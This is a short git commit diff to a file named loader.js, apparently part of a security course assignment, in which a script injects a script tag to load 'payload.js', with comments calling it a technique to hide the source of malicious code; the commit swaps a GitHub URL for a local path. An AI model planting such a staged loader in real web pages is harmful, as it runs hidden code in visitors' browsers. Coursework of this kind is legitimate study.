93fdff166ecea560db160c837b82931ab279b4ee
Sergei Chuprov <sergei.chuprov@utrgv.edu>
2025-08-18 21:47:48 -0500

    Update loader.js

--- loader.js
+++ loader.js
@@ -2,7 +2,7 @@
 (function() {
     // This script dynamically loads the final payload.
     // This technique is often used to hide the true source of the malicious code.
-    var payloadUrl = 'https://raw.githubusercontent.com/sergeichuprov/FISS_assignment/main/payload.js';
+    var payloadUrl = 'payload.js';
     var scriptElement = document.createElement('script');
     scriptElement.src = payloadUrl;
     document.head.appendChild(scriptElement);
